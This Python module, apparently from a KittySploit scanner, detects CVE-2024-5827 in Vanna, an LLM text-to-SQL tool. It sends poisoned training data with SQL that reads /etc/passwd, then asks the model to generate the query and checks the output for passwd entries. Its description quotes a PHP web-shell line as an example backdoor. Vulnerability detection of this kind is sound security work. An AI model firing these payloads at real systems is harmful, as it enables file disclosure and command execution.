#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vanna v0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vanna - SQL injection Detection',
        'description': "Vanna v0.3.4 is vulnerable to SQL injection in its DuckDB integration exposed to its Flask Web APIs. Attackers can inject malicious SQL training data and generate corresponding queries to write arbitrary files on the victim's file system, such as backdoor.php with contents `<?php system($_GET[0]); ?>`. This can lead to command execution or the creation of backdoors.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'vanna', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://huntr.com/bounties/a3f913d6-c717-4528-b974-26d8d9e839ca',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-5827',
            'https://huntr.com/bounties/e4e64a51-618b-41d0-8f56-1d2146d8825e',
            'https://github.com/fkie-cad/nvd-json-data-feeds',
        ],
        'cve': 'CVE-2024-5827',
    }

    def run(self):
        path = '/api/v0/train'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"sql":"SELECT pg_read_file(\'/etc/passwd\', 0, 1000);"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('id":',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/api/v0/generate_sql?question=What%20is%20the%20content%20of%20the%20first%201000%20characters%20of%20the%20%2Fetc%2Fpasswd%20file?'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Vanna - SQL injection detected', path=path)
            return True
        return False

